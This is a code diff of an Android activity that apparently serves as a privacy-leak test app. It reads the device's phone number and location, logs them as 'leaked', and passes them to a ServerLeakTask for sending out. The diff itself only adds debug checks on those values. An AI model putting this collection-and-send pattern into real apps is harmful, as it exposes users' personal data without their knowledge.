@@ -193,7 +193,6 @@ public class Main extends AppCompatActivity {
         }
 
 
-
     }
 
     ///PHYO
@@ -207,6 +206,10 @@ public class Main extends AppCompatActivity {
         }
 
         prependToLog("Leaked Phone Number: " + phoneNumber);
+
+        if (phoneNumber.equals("555-1234")) {
+            Log.d(TAG, "default phone number");
+        }
 
         ServerLeakTask slt = new ServerLeakTask();
         slt.execute(phoneNumber);
@@ -325,6 +328,13 @@ public class Main extends AppCompatActivity {
         String strDate = mdformat.format(Calendar.getInstance().getTime());
 
         String newPart = "Leaked Location: (" + loc.getLatitude() + ", " + loc.getLongitude() + ") at " + strDate;
+
+        if(25.0 < loc.getLatitude() && loc.getLatitude() < 50.0){
+            if(-65.0 > loc.getLongitude() && loc.getLongitude() > -125.0){
+                Log.d(TAG, "Device seems to be in the continental United States");
+            }
+        }
+
         prependToLog(newPart);
 
         ServerLeakTask slt = new ServerLeakTask();
